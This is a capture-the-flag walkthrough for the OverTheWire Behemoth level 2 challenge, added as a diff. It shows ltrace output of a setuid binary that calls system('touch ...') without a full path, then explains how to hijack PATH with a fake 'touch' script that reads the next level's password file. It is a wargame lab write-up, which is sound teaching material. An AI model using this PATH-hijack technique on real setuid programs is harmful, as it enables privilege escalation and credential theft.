@@ -1,0 +1,53 @@
+General premise of the level is just to manipulate and abuse the PATH environment variable!
+
+After disassembling/decompiling the binary, the general code checks to see if a file exists with a name matching the pid of the current process.
+
+If it does, it deletes that file, then recreates it using touch.
+
+If it doesn't exist, it uses touch to create the file, then sleeps for 2000 seconds...
+
+
+
+
+
+Notice the ltrace output:
+____________________________________________________________________________________
+λ ~/Documents/otw/behemoth/behemoth2/ master* ltrace ./behemoth2
+__libc_start_main(0x804856b, 1, 0xff8cd154, 0x8048660 <unfinished ...>
+getpid()                                                                 = 119616
+sprintf("touch 119616", "touch %d", 119616)                              = 12
+__lxstat(3, "119616", 0xff8cd010)                                        = -1
+unlink("119616")                                                         = -1
+geteuid()                                                                = 1000
+geteuid()                                                                = 1000
+setreuid(1000, 1000)                                                     = 0
+system("touch 119616" <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                   = 0
+sleep(2000^C <no return ...>
+--- SIGINT (Interrupt) ---
++++ killed by SIGINT +++
+λ ~/Documents/otw/behemoth/behemoth2/ master*
+____________________________________________________________________________________
+
+
+The main line of note is system()! It calls 'touch' directly... not using a hardcoded path. This means we can exploit the program.
+
+The solution is to create a script named 'touch' wherever you can, /tmp/taldgan2 in my case.
+
+The contents of the script???
+
+__________________________________
+#!/bin/bash
+cat /etc/behemoth_pass/behemoth3
+__________________________________
+
+Really simple!
+
+Now you go to the directory holding this new touch script, and alter the PATH environment variable to use files in the current directory first.
+
+"export PATH=.:$PATH"
+
+Now when you execute behemoth 2 and it runs "system(touch ???)", it will first run your program AND with the setuid bit of behemoth3.
+
+This dumps out the password for behemoth 3!
